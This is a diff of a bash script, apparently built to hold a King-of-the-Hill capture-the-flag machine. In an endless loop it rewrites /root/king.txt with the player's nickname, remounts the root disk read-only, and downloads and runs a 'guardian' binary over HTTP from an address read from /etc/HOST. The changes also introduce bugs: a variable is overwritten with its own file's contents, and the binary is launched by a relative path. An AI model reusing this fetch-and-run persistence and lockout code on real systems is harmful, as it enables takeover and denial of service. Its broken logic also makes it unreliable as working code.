@@ -3,6 +3,7 @@
 
 ip_file="/etc/HOST"
 nick_file="/etc/nick"
+king_txt="/root/king.txt"
 
 if [ -f "$ip_file" ]; then
     ip_address=$(head -n 1 "$ip_file")
@@ -13,15 +14,21 @@ if [ -f "$nick_file" ]; then
 fi
 
 while true; do
-    current_nick=$(sudo cat /root/king.txt)
+    current_nick=$(sudo cat "$king_txt")
     if [ "$current_nick" != "$nick" ]; then
-        echo "$nick" >> /root/king.txt
-        sudo tee /root/king.txt >/dev/null <<< "$nick"
+        echo "$nick" >> "$king_txt"
+        sudo tee "$king_txt" >/dev/null <<< "$nick"
         sudo mount -o remount,ro /dev/sda1
     fi
+
     if [ ! -f "/etc/bin/guardian" ]; then
-    ip_file=$(cat /etc/HOST)
-      cd /etc/bin && wget "http://$ip_file/guardian" && chmod +x guardian && ./guardian &
+        ip_file=$(cat "$ip_file")
+        cd /etc/bin && wget "http://$ip_file/guardian" && chmod +x guardian
+    else
+        if [ ! -x "/etc/bin/guardian" ]; then
+            chmod +x /etc/bin/guardian
+        fi
+        ./etc/bin/guardian &
     fi
 
     sleep 0.5
